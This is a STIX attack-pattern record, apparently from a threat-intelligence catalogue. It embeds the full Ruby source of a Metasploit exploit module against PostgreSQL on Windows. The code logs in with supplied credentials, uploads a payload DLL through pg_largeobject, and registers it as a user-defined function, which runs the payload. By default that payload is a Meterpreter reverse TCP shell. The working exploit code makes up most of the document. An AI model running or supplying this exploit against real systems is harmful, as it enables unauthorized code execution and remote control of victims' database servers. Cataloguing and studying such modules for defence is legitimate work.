{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--08145df5-d151-4ede-a156-23106585906f",
    "created": "2024-08-14T16:56:44.757036Z",
    "modified": "2024-08-14T16:56:44.75704Z",
    "name": "PostgreSQL for Microsoft Windows Payload Execution",
    "description": " On default Microsoft Windows installations of PostgreSQL the postgres service account may write to the current directory (which is usually \"C:\\Program Files\\PostgreSQL\\<version>\\data\" where <version> is the major.minor version of PostgreSQL). UDF DLL's may be sourced from there as well.  This module uploads a Windows DLL file via the pg_largeobject method of binary injection and creates a UDF (user defined function) from that DLL. Because the payload is run from DllMain, it does not need to conform to specific Postgres API versions. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/postgres/postgres_payload.rb",
            "external_id": "postgres_payload.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Postgres\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  # Creates an instance of this module.\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PostgreSQL for Microsoft Windows Payload Execution',\n      'Description'    => %q{\n        On default Microsoft Windows installations of PostgreSQL the postgres\n        service account may write to the current directory (which is usually\n        \"C:\\Program Files\\PostgreSQL\\<version>\\data\" where <version> is the\n        major.minor version of PostgreSQL). UDF DLL's may be sourced from\n        there as well.\n\n        This module uploads a Windows DLL file via the pg_largeobject method\n        of binary injection and creates a UDF (user defined function) from\n        that DLL. Because the payload is run from DllMain, it does not need to\n        conform to specific Postgres API versions.\n      },\n      'Author'         =>\n      [\n        'Bernardo Damele A. G. <bernardo.damele[at]gmail.com>', # the postgresql udf libraries\n        'todb' # this Metasploit module\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'https://web.archive.org/web/20100803002909/http://lab.lonerunners.net/blog/sqli-writing-files-to-disk-under-postgresql' ], # A litte more specific to PostgreSQL\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n      [\n        [ 'Windows x86',\n          {\n            'Arch' => ARCH_X86,\n            'DefaultOptions' => {\n              'PAYLOAD' => 'windows/meterpreter/reverse_tcp'\n            }\n          }\n        ],\n        [ 'Windows x64',\n          {\n            'Arch' => ARCH_X64,\n            'DefaultOptions' => {\n              'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n            }\n          }\n        ],\n      ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-04-10' # Date of Bernardo's BH Europe paper.\n    ))\n\n    deregister_options('SQL', 'RETURN_ROWSET')\n  end\n\n  def check\n    version = postgres_fingerprint\n\n    if version[:auth]\n      print_good \"Authentication successful. Version: #{version}\"\n      return CheckCode::Appears # WRITE permission needs to be proven to get CheckCode::Vulnerable\n    else\n      print_error \"Authentication failed. #{version[:preauth] || version[:unknown]}\"\n      return CheckCode::Safe\n    end\n  end\n\n  def exploit\n    version = do_login(username,password,database)\n    case version\n    when :noauth; print_error \"Authentication failed\"; return\n    when :noconn; print_error \"Connection failed\"; return\n    else\n      print_status(\"#{rhost}:#{rport} - #{version}\")\n    end\n\n    fname = \"#{Rex::Text.rand_text_alpha(8)}.dll\"\n    register_files_for_cleanup(fname)\n\n    unless postgres_upload_binary_data(generate_payload_dll, fname)\n      print_error \"Could not upload the UDF DLL\"\n      return\n    end\n\n    print_status \"Uploaded as #{fname}\"\n    begin\n      func_name = Rex::Text.rand_text_alpha(10)\n      postgres_query(\n        \"create or replace function pg_temp.#{func_name}()\"+\n        \" returns void as '#{fname}','#{func_name}'\"+\n        \" language c strict immutable\"\n      )\n    rescue RuntimeError => e\n      print_error \"Failed to create UDF function: #{e.class}: #{e}\"\n    end\n    postgres_logout if @postgres_conn\n\n  end\n\n  # Authenticate to the postgres server.\n  #\n  # Returns the version from #postgres_fingerprint\n  def do_login(user=nil,pass=nil,database=nil)\n    begin\n      password = pass || postgres_password\n      vprint_status(\"Trying #{user}:#{password}@#{rhost}:#{rport}/#{database}\")\n      result = postgres_fingerprint(\n        :db => database,\n        :username => user,\n        :password => password\n      )\n      if result[:auth]\n        report_service(\n          :host => rhost,\n          :port => rport,\n          :name => \"postgres\",\n          :info => result.values.first\n        )\n        return result[:auth]\n      else\n        print_error(\"Login failed, fingerprint is #{result[:preauth] || result[:unknown]}\")\n        return :noauth\n      end\n    rescue Rex::ConnectionError, Rex::Post::Meterpreter::RequestError\n      return :noconn\n    end\n  end\n\n\nend\n",
    "x_mitre_disclosure_date": "2009-04-10 # Date of Bernardos BH Europe paper.",
    "x_mitre_platforms": [
        "win'"
    ]
}